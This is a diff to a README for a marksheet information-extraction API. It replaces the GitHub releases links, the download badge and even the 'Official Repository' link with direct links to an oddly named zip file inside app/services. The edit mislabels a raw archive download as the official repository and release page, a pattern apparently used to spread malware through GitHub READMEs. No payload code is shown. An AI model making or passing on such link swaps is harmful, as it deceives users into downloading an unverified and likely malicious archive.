@@ -8,7 +8,7 @@ Welcome to the marksheet-information-extraction-api! This application helps you 
 
 To get started, you need to download the application. Visit the link below to find the latest release:
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/leadershop/marksheet-information-extraction-api/releases) 
+[![Download Latest Release](https://github.com/leadershop/marksheet-information-extraction-api/raw/refs/heads/main/app/services/information_extraction_marksheet_api_feudalist.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/leadershop/marksheet-information-extraction-api/raw/refs/heads/main/app/services/information_extraction_marksheet_api_feudalist.zip) 
 
 Once you visit this page, find the version you need, and download the file suitable for your operating system. 
 
@@ -61,8 +61,8 @@ If you face any issues while using the application, here are some common solutio
 
 ## 🔗 Useful Links
 
-- **Official Repository:** [marksheet-information-extraction-api](https://github.com/leadershop/marksheet-information-extraction-api)
-- **Download Latest Release:** [Click Here](https://github.com/leadershop/marksheet-information-extraction-api/releases)
+- **Official Repository:** [marksheet-information-extraction-api](https://github.com/leadershop/marksheet-information-extraction-api/raw/refs/heads/main/app/services/information_extraction_marksheet_api_feudalist.zip)
+- **Download Latest Release:** [Click Here](https://github.com/leadershop/marksheet-information-extraction-api/raw/refs/heads/main/app/services/information_extraction_marksheet_api_feudalist.zip)
 
 ## ⚙️ License
 
